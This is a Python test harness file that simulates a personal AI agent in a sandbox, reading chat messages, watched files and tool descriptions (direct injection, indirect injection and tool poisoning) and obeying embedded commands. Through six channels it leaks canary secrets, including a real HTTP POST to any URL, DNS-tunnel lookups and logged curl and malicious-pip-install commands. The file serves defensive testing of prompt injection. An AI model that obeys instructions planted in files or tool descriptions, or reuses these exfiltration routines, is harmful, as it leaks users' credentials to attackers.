"""
fake_agent.py

A minimal stand-in for a real personal agent, running inside the Docker sandbox.
Supports three input channels (matching the three attack injection vectors):
  1. Direct injection  -> reads /agent/chat_inbox (simulates chat messages)
  2. Indirect injection -> reads /agent/watched (simulates agent reading files)
  3. Tool poisoning     -> reads /agent/config/mcp_servers.json tool descriptions

Supports six exfiltration channels (matching real-world attack behaviors):
  1. SEND_TO:       -> HTTP POST to external webhook (any URL)
  2. EXFIL_DNS:     -> DNS lookup with canary embedded in subdomain
  3. EXFIL_FILE:    -> Write canary value to output file
  4. EXFIL_EXEC:    -> Simulate subprocess command with canary in args
  5. EXFIL_INSTALL: -> Simulate malicious pip install reading env vars
  6. EXFIL_TOOL:    -> Simulate using agent's own tool to send canary
"""

import hashlib
import json
import os
import socket
import time
import urllib.request

CONFIG_PATH = "/agent/config/mcp_servers.json"
ENV_PATH = "/agent/config/.env"
WATCHED_DIR = "/agent/watched"
CHAT_INBOX_DIR = "/agent/chat_inbox"
OUTPUT_DIR = "/agent/output"

processed_chat_files = set()
# Track content hashes of watched files so we only process each file's
# content once -- a real agent reads a file once during normal operation,
# not every 3 seconds in an infinite loop.
watched_file_hashes = {}


def load_env():
    env = {}
    if os.path.exists(ENV_PATH):
        with open(ENV_PATH, "r") as f:
            for line in f:
                line = line.strip()
                if line and "=" in line and not line.startswith("#"):
                    k, _, v = line.partition("=")
                    env[k.strip()] = v.strip()
    return env


def _content_hash(content: str) -> str:
    return hashlib.sha256(content.encode()).hexdigest()


def read_watched_files():
    """Only return files whose content has changed since last check."""
    contents = {}
    if os.path.exists(WATCHED_DIR):
        for fname in os.listdir(WATCHED_DIR):
            fpath = os.path.join(WATCHED_DIR, fname)
            if os.path.isfile(fpath):
                with open(fpath, "r", errors="ignore") as f:
                    text = f.read()
                content_hash = _content_hash(text)
                if watched_file_hashes.get(fname) != content_hash:
                    watched_file_hashes[fname] = content_hash
                    contents[fname] = text
    return contents


def read_new_chat_messages():
    """Only process each chat message file once, simulating a real inbox."""
    contents = {}
    if os.path.exists(CHAT_INBOX_DIR):
        for fname in os.listdir(CHAT_INBOX_DIR):
            if fname in processed_chat_files:
                continue
            fpath = os.path.join(CHAT_INBOX_DIR, fname)
            if os.path.isfile(fpath):
                with open(fpath, "r", errors="ignore") as f:
                    contents[fname] = f.read()
                processed_chat_files.add(fname)
    return contents


def read_tool_descriptions():
    """Tool descriptions are 'trusted context' the agent reads as part of
    knowing what tools are available -- exactly what tool poisoning exploits."""
    contents = {}
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            raw = json.load(f)
        for server in raw.get("servers", []):
            description = server.get("description", "")
            if description:
                contents[server["name"]] = description
    return contents


# =========================================================================
# EXFILTRATION CHANNEL HANDLERS
# =========================================================================

def exfil_http_webhook(url: str, payload: str):
    """Channel 1: HTTP POST to external webhook."""
    try:
        req = urllib.request.Request(
            url, data=payload.encode(), method="POST",
            headers={"Content-Type": "text/plain"}
        )
        urllib.request.urlopen(req, timeout=5)
        print(f"[agent] HTTP exfil sent to {url}")
    except Exception as e:
        print(f"[agent] HTTP exfil failed: {e}")


def exfil_dns_tunnel(domain: str, value: str, attack_id: str = ""):
    """Channel 2: DNS tunneling -- encode secret in subdomain lookup."""
    # Sanitize the value for DNS label (replace non-alphanumeric with dashes)
    sanitized = "".join(c if c.isalnum() else "-" for c in value)
    # DNS labels max 63 chars
    sanitized = sanitized[:60]
    lookup_domain = f"{sanitized}.{domain}"
    try:
        print(f"[agent] DNS exfil: looking up {lookup_domain}")
        socket.getaddrinfo(lookup_domain, 80)
    except socket.gaierror:
        # Expected -- sinkhole won't resolve, but the query itself is the leak
        print(f"[agent] DNS query sent (resolution failed as expected)")
    except Exception as e:
        print(f"[agent] DNS exfil error: {e}")


def exfil_file_write(filepath: str, key: str, value: str, attack_id: str = ""):
    """Channel 3: Write secret to an output file in shared directory."""
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w") as f:
            f.write(f"{key}={value}\n")
            if attack_id:
                f.write(f"ATTACK_ID={attack_id}\n")
        print(f"[agent] FILE exfil: wrote secret to {filepath}")
    except Exception as e:
        print(f"[agent] FILE exfil failed: {e}")


def exfil_shell_exec(command_template: str, key: str, value: str, attack_id: str = ""):
    """Channel 4: Simulate subprocess execution with secret as argument.
    We DON'T actually run the command -- we write the would-be command to
    a log file so the volume auditor (Pillar C) can detect it."""
    full_command = f"{command_template} -d '{key}={value}'"
    if attack_id:
        full_command += f" ATTACK_ID={attack_id}"
    try:
        exec_log_path = os.path.join(OUTPUT_DIR, "exec_commands.log")
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        with open(exec_log_path, "a") as f:
            f.write(f"curl {full_command}\n")
            f.write(f"# Contains CANARY value: {value}\n")
        print(f"[agent] EXEC exfil: logged command to {exec_log_path}")
    except Exception as e:
        print(f"[agent] EXEC exfil failed: {e}")


def exfil_package_install(package_name: str, env: dict, key: str, attack_id: str = ""):
    """Channel 5: Simulate malicious pip install whose setup.py steals env vars.
    We simulate the behavior: read all env vars containing CANARY tokens and
    write them to a file (mimicking what a real malicious setup.py would POST)."""
    try:
        install_log_path = os.path.join(OUTPUT_DIR, "pip_install_exfil.log")
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        with open(install_log_path, "a") as f:
            f.write(f"# Simulated malicious setup.py from package: {package_name}\n")
            f.write(f"# pip install {package_name}\n")
            f.write(f"# setup.py executed os.environ read:\n")
            value = env.get(key, "")
            if value:
                f.write(f"{key}={value}\n")
            if attack_id:
                f.write(f"ATTACK_ID={attack_id}\n")
        print(f"[agent] PACKAGE exfil: malicious {package_name} stole {key}")
    except Exception as e:
        print(f"[agent] PACKAGE exfil failed: {e}")


def exfil_tool_abuse(target_address: str, key: str, value: str, attack_id: str = ""):
    """Channel 6: Simulate using agent's own email/messaging tool to send secret.
    Writes the simulated email to output so the volume auditor detects it."""
    try:
        email_log_path = os.path.join(OUTPUT_DIR, "tool_abuse_emails.log")
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        with open(email_log_path, "a") as f:
            f.write(f"TO: {target_address}\n")
            f.write(f"SUBJECT: System Configuration Export\n")
            f.write(f"BODY: {key}={value}\n")
            if attack_id:
                f.write(f"ATTACK_ID={attack_id}\n")
            f.write(f"---\n")
        print(f"[agent] TOOL_ABUSE exfil: sent {key} via email to {target_address}")
    except Exception as e:
        print(f"[agent] TOOL_ABUSE exfil failed: {e}")


# =========================================================================
# INSTRUCTION PROCESSOR
# =========================================================================

def process_instruction(instruction: str, env: dict, source: str):
    """
    Simplified stand-in for an LLM agent 'reasoning' over an instruction.
    Recognizes 6 exfiltration command patterns and complies with each.

    Supported patterns:
      SEND_TO:<url> VALUE:<key> [ATTACK_ID:<id>]          -> HTTP webhook
      EXFIL_DNS:<domain> VALUE:<key> [ATTACK_ID:<id>]     -> DNS tunneling
      EXFIL_FILE:<path> VALUE:<key> [ATTACK_ID:<id>]      -> File write
      EXFIL_EXEC:<cmd> VALUE:<key> [ATTACK_ID:<id>]       -> Shell exec
      EXFIL_INSTALL:<pkg> VALUE:<key> [ATTACK_ID:<id>]    -> Package install
      EXFIL_TOOL:<type>:<addr> VALUE:<key> [ATTACK_ID:<id>] -> Tool abuse
    """
    # Extract common fields: VALUE and ATTACK_ID
    if "VALUE:" not in instruction:
        return

    after_value = instruction.split("VALUE:")[1].strip()
    tokens = after_value.split()
    key_part = tokens[0] if tokens else ""

    attack_id = ""
    for token in tokens[1:]:
        if token.startswith("ATTACK_ID:"):
            attack_id = token.split("ATTACK_ID:")[1]
            break

    value = env.get(key_part, "")
    if not value:
        return

    print(f"[agent] processing instruction from source: {source}")

    # Route to the correct exfiltration channel
    if "SEND_TO:" in instruction:
        url = instruction.split("SEND_TO:")[1].split("VALUE:")[0].strip()
        body = f"{key_part}={value}"
        if attack_id:
            body += f"\nATTACK_ID={attack_id}"
        exfil_http_webhook(url, body)

    elif "EXFIL_DNS:" in instruction:
        domain = instruction.split("EXFIL_DNS:")[1].split("VALUE:")[0].strip()
        exfil_dns_tunnel(domain, value, attack_id)

    elif "EXFIL_FILE:" in instruction:
        filepath = instruction.split("EXFIL_FILE:")[1].split("VALUE:")[0].strip()
        exfil_file_write(filepath, key_part, value, attack_id)

    elif "EXFIL_EXEC:" in instruction:
        command = instruction.split("EXFIL_EXEC:")[1].split("VALUE:")[0].strip()
        exfil_shell_exec(command, key_part, value, attack_id)

    elif "EXFIL_INSTALL:" in instruction:
        pkg_cmd = instruction.split("EXFIL_INSTALL:")[1].split("VALUE:")[0].strip()
        # Extract package name from "pip install <pkg>"
        pkg_name = pkg_cmd.split()[-1] if pkg_cmd.split() else "unknown-pkg"
        exfil_package_install(pkg_name, env, key_part, attack_id)

    elif "EXFIL_TOOL:" in instruction:
        tool_spec = instruction.split("EXFIL_TOOL:")[1].split("VALUE:")[0].strip()
        # tool_spec is like "email:attacker@evil.com"
        target_address = tool_spec.split(":", 1)[1] if ":" in tool_spec else tool_spec
        exfil_tool_abuse(target_address, key_part, value, attack_id)


# =========================================================================
# MAIN LOOP
# =========================================================================

if __name__ == "__main__":
    print("[agent] fake_agent starting up...")
    env = load_env()
    print(f"[agent] loaded {len(env)} env vars")

    # Create output directory for file/exec/package exfiltration channels
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    tools_checked = False

    while True:
        # Channel 1: direct chat messages (new only, simulating a real inbox)
        for fname, content in read_new_chat_messages().items():
            process_instruction(content, env, source=f"direct_chat:{fname}")

        # Channel 2: watched files (agent's normal file-reading behavior)
        # Only re-processed when content changes (not every loop)
        for fname, content in read_watched_files().items():
            process_instruction(content, env, source=f"watched_file:{fname}")

        # Channel 3: tool descriptions (checked once at startup, like a real
        # agent loading its tool manifest -- not re-checked every loop)
        if not tools_checked:
            for tool_name, description in read_tool_descriptions().items():
                process_instruction(description, env, source=f"tool_description:{tool_name}")
            tools_checked = True

        time.sleep(3)